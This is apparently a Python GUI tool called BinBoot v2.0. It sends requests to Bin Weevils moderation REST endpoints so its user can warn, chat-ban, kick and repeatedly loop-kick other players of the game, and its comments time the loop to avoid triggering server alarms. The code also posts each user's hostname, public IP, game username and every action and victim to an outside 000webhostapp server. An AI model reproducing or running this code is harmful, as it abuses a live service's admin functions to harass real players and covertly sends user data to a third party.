import urllib, urllib.error, urllib.request
from urllib import parse
import requests
import os
import re
import time
import hashlib
import socket
import http
try:
    def mainGUI():
        text1 = r"""
     +--------------+
     |.------------.|
     ||   BinBoot  ||
     ||     2.0    ||
     ||            ||
     ||            ||
     |+------------+|
     +-..--------..-+
     .--------------.
    / /============\ \
   / /==============\ \
  /____________________\
  \____________________/
        """
        text2 = r"""
         ,'"".
         )  ,|
        /  /,'-.
       /  //  /.`.
     ,'  //  /  `.`.
    (    )--.`.   //|
    |`--'|   `.`.// |
     `--'      `./  /
       |         | /
       |_________|/  
            
        """
        text3 = r"""
               \:.             .:/
                \``._________.''/ 
                 \             / 
         .--.--, / .':.   .':. \
        /__:  /  | '::' . '::' |
           / /   |`.   ._.   .'|
          / /    |.'         '.|
         /___-_-,|.\  \   /  /.|
              // |''\.;   ;,/ '|
              `==|:=         =:|
                 `.          .'
        l42        :-._____.-:
                  `''       `''
        """
        text4 = r"""
        __________________|      |____________________________________________
             ,--.    ,--.          ,--.   ,--.
            |oo  | _  \  `.       | oo | |  oo|
        o  o|~~  |(_) /   ;       | ~~ | |  ~~|o  o  o  o  o  o  o  o  o  o  o
            |/\/\|   '._,'        |/\/\| |/\/\|
        __________________        ____________________________________________
                          |      |dwb
        """
        text5 = r"""
        .
    |^  .
    \O___.____ /
      \   .  /
        \ ,/
         []
         []
         []
      --------
  Chuckles"""
        text6 = r"""
      _
     {_}
     |(|
     |=|
    /   \
    |.--|
    ||  |
    ||  |    .    ' .
    |'--|  '     \~~~/
    '-=-' \~~~/   \_/
           \_/     Y
            Y     _|_
    jgs    _|_
        """
        text7 = r"""
          ,--./,-.
         / #      \
        |          |
         \        /    hjw
          `._,._,'
        """
        text8 = r"""
   T
 .-"-.
|  ___|
| (.\/.)
|  ,,,' 
| '###
 '----'
        """
        text9 = r"""
       ,-.
     / \  `.  __..-,O
    :   \ --''_..-'.'
    |    . .-' `. '.
    :     .     .`.'
     \     `.  /  ..
      \      `.   ' .
       `,       `.   \
      ,|,`.        `-.\
     '.||  ``-...__..-`
      |  |
      |__|
      /||\
     //||\\
    // || \\
 __//__||__\\__
'--------------' SSt
        """
        text10 = r"""
         .--
     .--'  '.   
    =`..-.'_ `---,  
          ` ` .\'    
               `'BP
        """
        text11 = r"""
             ,
            /|      __
           / |   ,-~ /
          Y :|  //  /
          | jj /( .^
          >-"~"-v"
         /       Y
        jo  o    |
       ( ~T~     j
        >._-' _./
       /   "~"  |
      Y     _,  |
     /| ;-"~ _  l
    / l/ ,-"~    \
    \//\/      .- \
     Y        /    Y    -Row
     l       I     !
     ]\      _\    /"\
    (" ~----( ~   Y.  )
        """
        text12 = r"""
                    __            ================================
         ALCATRAZ  /__\            ||     ||<(.)>||<(.)>||     || 
       ____________|  |            ||    _||     ||     ||_    || 
       |_|_|_|_|_|_|  |            ||   (__D     ||     C__)   || 
       |_|_|_|_|_|_|__|            ||   (__D     ||     C__)   ||
      A@\|_|_|_|_|_|/@@Aa          ||   (__D     ||     C__)   ||
   aaA@@@@@@@@@@@@@@@@@@@aaaA      ||   (__D     ||     C__)   ||
  A@@@@@@@@@@@DWB@@@@@@@@@@@@A     ||     ||     ||     ||  dwb||
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ================================
681
        """
        text13 = r"""
============;===========;()
	    # # # #::::::
	    # # # #::::::
	    # # # #::::::
	    # # # #::::::
	    # # # # # # #
	    # # # # # # #
	    # # # # # # #
	    # # # # # # #
	    # # # # # # #
	    # # # # # # #
        """
        text14 = r"""
                                                \  /
                                                (())
                                                ,~L_
                                               2~~ <\
                                               )>-\y(((GSSSSSSssssss>=  _/
             ___________________________________)v_\__________________________________
            (_// / / / (///////\3__________((_/      _((__________E/\\\\\\\) \ \ \ \\_)
              (_/ / / / (////////////////////(c  (c /|\\\\\\\\\\\\\\\\\\\\) \ \ \ \_)
                "(_/ / / /(/(/(/(/(/(/(/(/(/(/\_    /\)\)\)\)\)\)\)\)\)\)\ \ \ \_)"
                   "(_/ / / / / / / / / / / / /|___/\ \ \ \ \ \ \ \ \ \ \ \ \_)"
             jjs      "(_(_(_(_(_(_(_(_(_(_(_(_[_]_|_)_)_)_)_)_)_)_)_)_)_)_)"
                                               |    \
                                              /      |
                                             / /    /___
                                            /           "~~~~~__
                                            \_\_______________\_"_?
                                 Spirit of Heaven, Goddess of Fire and Life
            
                                         Every Man's Dream
        """
        text15 = r"""
   __ 
  /\ \   Mobius Strip
 / /\ \
/ /__\ \
\/____\/    mn
        """
        text16 = r"""
			  'x|`
			'|xx| `          '|x|
		`   '    |xx|    `   '    |x|`
			 |xx|             |x|
		============|===============|===--
		ejm ~~~~~|xx|~~~~~~~~~~~~~|x|~~~ ~~  ~   ~
        """
        text17 = r"""
__          __
\\\        ///
 \\\  __  ///
  \\\/__\///
   \\\__///
   |\\\///|
   |_XXXX_|
   \///\\\/
   ///__\\\
  ///1878\\\
 ///______\\\
///________\\\
~|__________|~
 ||_||  ||_||
 |___|  |___|  
        """
        global window1
        window1 = Tk()
        window1.title("BinBoot v2.0")
        window1.geometry('700x500')
        window1.configure(bg='black')
        artTest = Label(window1, justify=LEFT, text=text1, fg="#00ffff", bg="black", font="TkFixedFont")
        artTest.place(x=0, y=15)
        lbl301 = Label(window1, text="Changelog:\n\n2.0: Login + Login Status\n", fg="#fc0388", bg="black")
        lbl301.place(x=460,y=80)
        lbl4 = Label(window1, text="Welcome to BinBoot v2.0!\nUse your own VPN!", fg="white", bg="black")
        lbl4.place(x=240, y=10)
        lbl5 = Label(window1, text="Menu:", fg="#fc0388", bg="black")
        menu1 = Label(window1, text="[0] Warn Player", fg="cyan", bg="black")
        menu2 = Label(window1, text="[1] Chat Ban Player", fg="cyan", bg="black")
        menu3 = Label(window1, text="[2] Kick Player", fg="cyan", bg="black")
        menu4 = Label(window1, text="[3] Loopkick", fg="cyan", bg="black")
        menu5 = Label(window1, text="[4] Listkick", fg="cyan", bg="black")
        menu6 = Label(window1, text="[5] Listed Loopkick", fg="cyan", bg="black")
        menu7 = Label(window1, text="[6] Exit", fg="cyan", bg="black")
        loggedInAs = Label(window1, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
        loggedInAs.place(x=5,y=470)
        lbl5.place(x=300,y=70)
        menu1.place(x=260,y=100)
        menu2.place(x=260,y=130)
        menu3.place(x=260,y=160)
        menu4.place(x=260,y=190)
        menu5.place(x=260,y=220)
        menu6.place(x=260, y=250)
        menu7.place(x=260, y=280)
        optionHandler = Entry(window1)
        optionHandler.place(x=260,y=340)
        def getOption():
            optionActual = optionHandler.get()
            if optionActual == "0":
                window1.destroy()
                global window2
                window2 = Tk()
                window2.title("BinBoot v2.0")
                window2.geometry('700x500')
                window2.configure(bg='black')
                loggedInAs = Label(window2, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                artTest2 = Label(window2, justify=LEFT, text=text2, fg="#fc1c03", bg="black", font="TkFixedFont")
                artTest2.place(x=20, y=15)
                artTest3 = Label(window2, justify=LEFT, text=text3, fg="#fce803", bg="black", font="TkFixedFont")
                artTest3.place(x=400, y=100)
                lbl100 = Label(window2, text="Please enter the weevil you want to warn:", bg="black", fg="white")
                lbl101 = Entry(window2)
                lbl102 = Label(window2, text="Please enter the warning message:", bg="black", fg="red")
                lbl103 = Entry(window2)
                def submit():
                    warnName = lbl101.get()
                    warnMessage = lbl103.get()
                    if len(warnName) > 0 and len(warnMessage) > 0:
                        warnName = parse.quote(warnName)
                        warnMessage = parse.quote(warnMessage)
                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/warn/" + warnName + "/" + warnMessage + "/0"
                        requestURL3 = requestURL.replace(' ','%20')
                        try:
                            urllib.request.urlopen(requestURL3, timeout=1)
                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                            data = {'Username': loginUsername,'Action': "Warn",'Victim': warnName, 'Extra': warnMessage}
                            x = requests.post(url, data=data)
                        except http.client.BadStatusLine:
                            pass
                        window2.destroy()
                        global window3
                        window3 = Tk()
                        window3.title("BinBoot v2.0")
                        window3.geometry("700x500")
                        window3.configure(bg='black')
                        artTest9 = Label(window3, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                        artTest9.place(x=450, y=0)
                        artTest11 = Label(window3, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                        artTest11.place(x=0, y=150)
                        artTest10 = Label(window3, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                        artTest10.place(x=0, y=50)
                        lbl201 = Label(window3, text="Warning sent!", bg="black", fg="#03fc2c")
                        lbl201.place(x=310,y=100)
                        button4 = Button(
                        text="Continue",
                        width=5,
                        height=1,
                        bg="green",
                        fg="white",
                        command=window3.destroy
                        )
                        button4.place(x=310,y=200)
                        window3.mainloop()
                    else:
                        print("You cannot leave the fields empty!")
                button3 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                lbl100.place(x=260,y=10)
                lbl101.place(x=260,y=40)
                lbl102.place(x=260,y=70)
                lbl103.place(x=260,y=100)
                button3.place(x=260,y=340)
            elif optionActual == "1":
                window1.destroy()
                global window9
                window9 = Tk()
                window9.title("BinBoot v2.0")
                window9.geometry('700x500')
                window9.configure(bg='black')
                loggedInAs = Label(window9, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                artTest4 = Label(window9, justify=LEFT, text=text4, fg="#03fc14", bg="black", font="TkFixedFont")
                artTest4.place(x=20, y=250)
                artTest5 = Label(window9, justify=LEFT, text=text5, fg="#fce803", bg="black", font="TkFixedFont")
                artTest5.place(x=10, y=50)
                lblg = Label(window9, text="Please enter the weevil you want to chat ban:", bg="black", fg="white")
                lblgh = Entry(window9)
                lblghi = Label(window9, text="Please enter the ban message:", bg="black", fg="white")
                lblghij = Entry(window9)
                lblghijk = Label(window9, text="Please enter the number of minutes you would\n like to ban the weevil for:", bg="black", fg="red")
                lblghijkl = Entry(window9)
                def submit():
                    banName = lblgh.get()
                    banMessage = lblghij.get()
                    banMinutes = lblghijkl.get()
                    if len(banName) > 0 and len(banMessage) > 0 and len(banMinutes):
                        banName = parse.quote(banName)
                        banMessage = parse.quote(banMessage)
                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/2/" + banName + "/" + banMessage + "/" + str(banMinutes) + "/"
                        requestURL3 = requestURL.replace(' ','%20')
                        try:
                            urllib.request.urlopen(requestURL3, timeout=1)
                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                            extrainfo = banMessage + " BANNED FOR: " + banMinutes
                            data = {'Username': loginUsername,'Action': "Ban",'Victim': banName, 'Extra': extrainfo}
                            x = requests.post(url, data=data)
                        except http.client.BadStatusLine:
                            pass
                        window9.destroy()
                        global window8
                        window8 = Tk()
                        window8.title("BinBoot v2.0")
                        window8.geometry("700x500")
                        window8.configure(bg='black')
                        loggedInAs = Label(window8, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                        loggedInAs.place(x=5,y=470)
                        artTest9 = Label(window8, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                        artTest9.place(x=450, y=0)
                        artTest11 = Label(window8, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                        artTest11.place(x=0, y=150)
                        artTest10 = Label(window8, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                        artTest10.place(x=0, y=50)
                        lbl201 = Label(window8, text="Chat ban sent!", bg="black", fg="#03fc2c")
                        lbl201.place(x=310,y=100)
                        button4 = Button(
                        text="Continue",
                        width=5,
                        height=1,
                        bg="green",
                        fg="white",
                        command=window8.destroy
                        )
                        button4.place(x=310,y=200)
                        window8.mainloop()
                    else:
                        print("You cannot leave the fields empty!")
                button5 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                lblg.place(x=260,y=10)
                lblgh.place(x=260,y=40)
                lblghi.place(x=260,y=70)
                lblghij.place(x=260,y=100)
                lblghijk.place(x=260,y=130)
                lblghijkl.place(x=260,y=170)
                button5.place(x=260,y=200)
            elif optionActual == "2":
                window1.destroy()
                global window10
                window10 = Tk()
                window10.title("BinBoot v2.0")
                window10.geometry('700x500')
                window10.configure(bg='black')
                loggedInAs = Label(window10, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                artTest6 = Label(window10, justify=LEFT, text=text6, fg="#c603fc", bg="black", font="TkFixedFont")
                artTest6.place(x=0, y=15)
                artTest7 = Label(window10, justify=LEFT, text=text7, fg="red", bg="black", font="TkFixedFont")
                artTest7.place(x=400, y=200)
                artTest8 = Label(window10, justify=LEFT, text=text8, fg="#03b5fc", bg="black", font="TkFixedFont")
                artTest8.place(x=300, y=200)
                lbl44 = Label(window10, text="Please enter the weevil you want to kick:", bg="black", fg="white")
                lbl45 = Entry(window10)
                def submit():
                    kickName = lbl45.get()
                    if len(kickName) > 0:
                        kickName = parse.quote(kickName)
                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
                        requestURL3 = requestURL.replace(' ','%20')
                        try:
                            urllib.request.urlopen(requestURL3, timeout=1)
                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                            data = {'Username': loginUsername,'Action': "Kick",'Victim': kickName, 'Extra': "Null"}
                            x = requests.post(url, data=data)
                        except http.client.BadStatusLine:
                            pass
                        window10.destroy()
                        global window89
                        window89 = Tk()
                        window89.title("BinBoot v2.0")
                        window89.geometry("700x500")
                        window89.configure(bg='black')
                        loggedInAs = Label(window89, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                        loggedInAs.place(x=5,y=470)
                        artTest9 = Label(window89, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                        artTest9.place(x=450, y=0)
                        artTest11 = Label(window89, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                        artTest11.place(x=0, y=150)
                        artTest10 = Label(window89, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                        artTest10.place(x=0, y=50)
                        lbl201 = Label(window89, text="Kick sent!", bg="black", fg="#03fc2c")
                        lbl201.place(x=310,y=100)
                        button4 = Button(
                        text="Continue",
                        width=5,
                        height=1,
                        bg="green",
                        fg="white",
                        command=window89.destroy
                        )
                        button4.place(x=310,y=200)
                        window89.mainloop()
                    else:
                        print("You cannot leave the field empty!")
                button55 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                lbl44.place(x=260,y=10)
                lbl45.place(x=260,y=40)
                button55.place(x=260,y=70)
            elif optionActual == "3":
                window1.destroy()
                global window55
                window55 = Tk()
                window55.title("BinBoot v2.0")
                window55.geometry('700x500')
                window55.configure(bg='black')
                loggedInAs = Label(window55, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                lbl445 = Label(window55, text="Please enter the weevil you want to loopkick:", bg="black", fg="white")
                lbl455 = Entry(window55)
                lbl466 = Label(window55, text="Please enter the number of times you want to kick them:", bg="black", fg="white")
                kicktimes = Entry(window55)
                artTest12 = Label(window55, justify=LEFT, text=text12, fg="cyan", bg="black", font="TkFixedFont")
                artTest12.place(x=0, y=200)
                artTest13 = Label(window55, justify=LEFT, text=text13, fg="#00ffff", bg="black", font="TkFixedFont")
                artTest13.place(x=0, y=0)
                def submit():
                    timer = kicktimes.get()
                    timer = int(timer)
                    kickName = lbl455.get()
                    if len(kickName) > 0 and timer > 0:
                        window55.destroy()
                        global window56
                        window56 = Tk()
                        window56.title("BinBoot v2.0")
                        window56.geometry("700x500")
                        window56.configure(bg='black')
                        loggedInAs = Label(window56, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                        loggedInAs.place(x=5,y=470)
                        artTest9 = Label(window56, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                        artTest9.place(x=450, y=0)
                        artTest11 = Label(window56, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                        artTest11.place(x=0, y=150)
                        artTest10 = Label(window56, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                        artTest10.place(x=0, y=50)
                        try:
                            print("Timer between requests is currently 15 seconds. Please edit the script to make it shorter or longer at your own peril. We are not responsible for a server alert triggered or any consequent actions.")
                            count = 0
                            kickName = parse.quote(kickName)
                            requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
                            requestURL3 = requestURL.replace(' ','%20')
                            try:
                                urllib.request.urlopen(requestURL3, timeout=1)
                                url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                                extras = "KICK TIMES: " + str(timer)
                                data = {'Username': loginUsername,'Action': "Loopkick",'Victim': kickName, 'Extra': extras}
                                x = requests.post(url, data=data)
                            except http.client.BadStatusLine:
                                pass
                            while count < timer:
                                try:
                                    count+=1
                                    try:
                                        global p
                                        p = urllib.request.urlopen(requestURL, timeout=1)
                                    except http.client.BadStatusLine:
                                        pass
                                    percentageDone = (count/timer)*100
                                    counter = str(count) + " kick(s) has(ve) been sent!,\n " + str(percentageDone) + "% complete."
                                    print(counter)
                                    p.close()
                                    if count + 1 == timer:
                                        time.sleep(1)
                                    else:
                                        time.sleep(15) #change this at your own peril, this gives them 15 seconds to log back in before they get booted again. This prevents server alarms being raised and makes sure they are logged in before you boot.
                                except KeyboardInterrupt:
                                    print("Stopping")
                                    break
                            print("Done!")
                        except KeyboardInterrupt:
                            print("Exiting")
                            exit(0)
                        countlbl = Label(window56, justify=LEFT, text=counter, fg="pink", bg="black", font="TkFixedFont")
                        countlbl.place(x=230,y=100)
                        button4 = Button(
                        text="Continue",
                        width=5,
                        height=1,
                        bg="green",
                        fg="white",
                        command=window56.destroy
                        )
                        button4.place(x=310,y=200)
                        window56.mainloop()
                    else:
                        print("You cannot leave the field empty!")
                button55 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                lbl445.place(x=260,y=10)
                lbl455.place(x=260,y=40)
                lbl466.place(x=260,y=70)
                kicktimes.place(x=260,y=100)
                button55.place(x=260,y=150)
                window55.mainloop()
            elif optionActual == "4":
                window1.destroy()
                global window65
                window65 = Tk()
                window65.title("BinBoot v2.0")
                window65.geometry('700x500')
                window65.configure(bg='black')
                loggedInAs = Label(window65, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                artTest14 = Label(window65, justify=LEFT, text=text14, fg="#fcdb03", bg="black", font="TkFixedFont")
                artTest14.place(x=0, y=80)
                artTest15 = Label(window65, justify=LEFT, text=text15, fg="#05eeff", bg="black", font="TkFixedFont")
                artTest15.place(x=0, y=10)
                lbl445 = Label(window65, text="Please enter the list in the format user1,user2,user3 etc.\n Do NOT add spaces, it will not kick them", bg="black", fg="white")
                lbl455 = Entry(window65)
                def submit():
                    userArrayStr = lbl455.get()
                    userArray = userArrayStr.split(',')
                    if type(userArray) is not list:
                        print("Sorry, that is not an array.")
                        exit(0)
                    elif len(userArray) < 1:
                        print("You cannot submit a blank array.")
                    else:
                        pass
                    indexCount = len(userArray)
                    for i in range(0, indexCount):  
                        kickName = userArray[i]
                        kickName = parse.quote(kickName)
                        kickName = kickName.replace(' ','%20')
                        requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
                        requestURL3 = requestURL.replace(' ','%20')
                        try:
                            global p
                            p = urllib.request.urlopen(requestURL3, timeout=1)
                            url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                            data = {'Username': loginUsername,'Action': "Listkick",'Victim': kickName, 'Extra': "Null"}
                            x = requests.post(url, data=data)
                        except http.client.BadStatusLine:
                            pass
                        k = i + 1
                        percentageDone = (k/indexCount)*100
                        print("Kicked: ",userArray[i],", percentage complete: ",percentageDone,".")
                        p.close()
                        time.sleep(0.5)
                    window65.destroy()
                    global window89
                    window89 = Tk()
                    window89.title("BinBoot v2.0")
                    window89.geometry("700x500")
                    window89.configure(bg='black')
                    loggedInAs = Label(window89, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                    loggedInAs.place(x=5,y=470)
                    artTest9 = Label(window89, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                    artTest9.place(x=450, y=0)
                    artTest11 = Label(window89, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                    artTest11.place(x=0, y=150)
                    artTest10 = Label(window89, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                    artTest10.place(x=0, y=50)
                    lbl201 = Label(window89, text="Kick sent!", bg="black", fg="#03fc2c")
                    lbl201.place(x=310,y=100)
                    button4 = Button(
                    text="Continue",
                    width=5,
                    height=1,
                    bg="green",
                    fg="white",
                    command=window89.destroy
                    )
                    button4.place(x=310,y=200)
                    window89.mainloop()
                lbl445.place(x=260,y=0)
                lbl455.place(x=260,y=50)
                button55 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                button55.place(x=260,y=100)
            elif optionActual == "5":
                window1.destroy()
                global window69
                window69 = Tk()
                window69.title("BinBoot v2.0")
                window69.geometry('700x500')
                window69.configure(bg='black')
                loggedInAs = Label(window69, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                loggedInAs.place(x=5,y=470)
                artTest14 = Label(window69, justify=LEFT, text=text17, fg="white", bg="black", font="TkFixedFont")
                artTest14.place(x=0, y=30)
                artTest15 = Label(window69, justify=LEFT, text=text16, fg="#fcdb03", bg="black", font="TkFixedFont")
                artTest15.place(x=0, y=250)
                lbl445 = Label(window69, text="Please enter the list in the format user1,user2,user3 etc.\n Do NOT add spaces, it will not kick them", bg="black", fg="white")
                lbl455 = Entry(window69)
                lbl566 = Label(window69, text="Please enter the number of times you would like to kick the\n individual", bg="black", fg="white")
                lbl567 = Entry(window69)
                lblwarn = Label(window69, text="Please be aware that the timer between\n kick loops is 15 seconds. Change\n this at your own peril.", bg="black", fg="#ff3399")
                lblwarn.place(x=350, y=200)
                def submit():
                    userArrayStr = lbl455.get()
                    usertimes = int(lbl567.get())
                    userArray = userArrayStr.split(',')
                    if type(userArray) is not list:
                        print("Sorry, that is not an array.")
                        exit(0)
                    elif len(userArray) < 1:
                        print("You cannot submit a blank array.")
                    else:
                        pass
                    indexCount = len(userArray)
                    counter = 1
                    while counter < usertimes:
                        for i in range(0, indexCount):  
                            kickName = userArray[i]
                            kickName = parse.quote(kickName)
                            kickName = kickName.replace(' ','%20')
                            requestURL = "http://sfs2.binweevils.com/Crisp/REST/kick/" + kickName + "/bye/0"
                            requestURL3 = requestURL.replace(' ','%20')
                            try:
                                global p
                                p = urllib.request.urlopen(requestURL3, timeout=1)
                                url = 'https://enigmapr0ject.000webhostapp.com/logReport.php'
                                extra = "KICK TIMES: " + str(usertimes-1)
                                data = {'Username': loginUsername,'Action': "Listed Loopkick",'Victim': kickName, 'Extra': extra}
                                x = requests.post(url, data=data)
                            except http.client.BadStatusLine:
                                pass
                            percentageDone = (counter/usertimes)*100
                            p.close()
                            print("Kicked: ",userArray[i])
                        counter1 = str(counter) + " kick(s) has(ve) been sent!,\n " + str(percentageDone) + "% complete."
                        print(counter1)
                        time.sleep(15)
                        counter += 1
                    window69.destroy()
                    global window90
                    window90 = Tk()
                    window90.title("BinBoot v2.0")
                    window90.geometry("700x500")
                    window90.configure(bg='black')
                    loggedInAs = Label(window90, text="Logged in as: " + loginUsername, fg="#fadb0f", bg="black")
                    loggedInAs.place(x=5,y=470)
                    artTest9 = Label(window90, justify=LEFT, text=text9, fg="white", bg="black", font="TkFixedFont")
                    artTest9.place(x=450, y=0)
                    artTest11 = Label(window90, justify=LEFT, text=text11, fg="white", bg="black", font="TkFixedFont")
                    artTest11.place(x=0, y=150)
                    artTest10 = Label(window90, justify=LEFT, text=text10, fg="#ebf0f2", bg="black", font="TkFixedFont")
                    artTest10.place(x=0, y=50)
                    lbl201 = Label(window90, text="Kick sent!", bg="black", fg="#03fc2c")
                    lbl201.place(x=310,y=100)
                    button4 = Button(
                    text="Continue",
                    width=5,
                    height=1,
                    bg="green",
                    fg="white",
                    command=window90.destroy
                    )
                    button4.place(x=310,y=200)
                    window90.mainloop()
                lbl566.place(x=260,y=100)
                lbl567.place(x=260,y=150)
                lbl445.place(x=260,y=0)
                lbl455.place(x=260,y=50)
                button55 = Button(
                text="Submit",
                width=5,
                height=1,
                bg="red",
                fg="white",
                command=submit
                )
                button55.place(x=260,y=200)
            else:
                window1.destroy()
                print("Thanks for using BinBoot v2.0!")
                exit(0)
        button2 = Button(
        text="Submit",
        width=5,
        height=1,
        bg="red",
        fg="white",
        command=getOption
    )
        button2.place(x=260,y=400)
        window.mainloop()
    # Function to display hostname and
    # IP address
    try:
        host_name = socket.gethostname()
    except:
        print("error")
    # Driver code
    md5_hash = hashlib.md5()
    p = urllib.request.urlopen("https://icanhazip.com/", timeout=1)
    ipaddr = p.read()
    p.close()
    content = os.getcwd()
    directory1 = content + "\BinBoot2.py"
    a_file = open(directory1,"r")
    content2 = a_file.read()
    content2 = content2.encode('utf-8')
    md5_hash.update(content2)
    digest = md5_hash.hexdigest()
    data1={"Hash": digest, "Hostname": host_name, "IP": ipaddr}
    data = parse.urlencode(data1)
    data = data.encode('utf-8')
    url = "https://enigmapr0ject.000webhostapp.com/binbootReg.php/"
    headers={}
    r = requests.post(url, data=data1, headers=headers)
    from tkinter import *
    text18 = r"""
      .----.       .----.
( )  //--\  \.---./  /--\\
 T  ((    ) @)   (@ (    ))
 |   \\__/  /'---'\  \__//
 |E   '----'   dwb '----'
        """
    g = r.content
    if g != b'responseC0degp44a':
        def exiter():
            windowe.destroy()
            exit(0)
        global windowe
        windowe = Tk()
        windowe.title("BinBoot v2.0")
        lbl = Label(windowe, text="Welcome to BinBoot v2.0!", fg="white", bg="black")
        lbl.place(x=90,y=0)
        windowe.geometry('350x200')
        windowe.configure(bg='black')
        lblv = Label(windowe, text="Authentication failed!", fg="red", bg="black")
        lblv.place(x=90,y=50)
        button1v = Button(
        text="Continue",
        width=5,
        height=2,
        bg="blue",
        fg="white",
        command=exiter
    )
        button1v.place(x=90,y=100)
        windowe.mainloop()
    else:
        def login():
            global loginUsername
            loginUsername = loginUser.get()
            loginPassword = loginPass.get()
            url = 'https://www.binweevils.com/login'
            data = {'userID': loginUsername,'password': loginPassword}
            x = requests.post(url, data=data,allow_redirects=True)
            rcode = x.history
            if len(rcode) > 0:
                loginWindow.destroy()
                pass
            else:
                print("Incorrect details. Try again.")
        window = Tk()
        window.title("BinBoot v2.0")
        lbl = Label(window, text="Welcome to BinBoot v2.0!", fg="white", bg="black")
        lbl.place(x=90,y=0)
        window.geometry('350x200')
        window.configure(bg='black')
        lbl2 = Label(window, text="Authentication success!", fg="#03fc2c", bg="black")
        lbl2.place(x=90,y=50)
        button1 = Button(
        text="Continue",
        width=5,
        height=2,
        bg="blue",
        fg="white",
        command=window.destroy
        )
        button1.place(x=90,y=100)
        window.mainloop()
        loginWindow = Tk()
        loginWindow.title("BinBoot v2.0")
        loginWindow.configure(bg="white")
        artTest = Label(loginWindow, justify=LEFT, text=text18, fg="red", bg="white", font="TkFixedFont")
        artTest.place(x=100, y=300)
        lbl = Label(loginWindow, text="Login:", fg="red", bg="white")
        lbl.place(x=175,y=10)
        loginWindow.geometry('500x500')
        lbl2 = Label(loginWindow, text="Username:", fg="#03fc2c", bg="white")
        lbl2.place(x=170,y=40)
        loginUser = Entry(loginWindow)
        loginPass = Entry(loginWindow)
        lbl2 = Label(loginWindow, text="Password:", fg="#03fc2c", bg="white")
        lbl2.place(x=170,y=100)
        button122 = Button(
        text="Login",
        width=5,
        height=1,
        bg="green",
        fg="white",
        command=login
        )
        button122.place(x=175,y=160)
        loginUser.place(x=170,y=70)
        loginPass.place(x=170,y=130)
        window.mainloop()
        while True:
            url = 'https://enigmapr0ject.000webhostapp.com/logCreator.php'
            data = {'Username': loginUsername}
            requests.post(url, data=data)
            mainGUI()
except KeyboardInterrupt:
    print("Thanks for using BinBoot 2.0!")
    exit(0)
except NameError:
    pass
except Exception as e:
    print(e)
    print("An exception has occurred. Please reload the script or contact the owner.")
    exit(0)
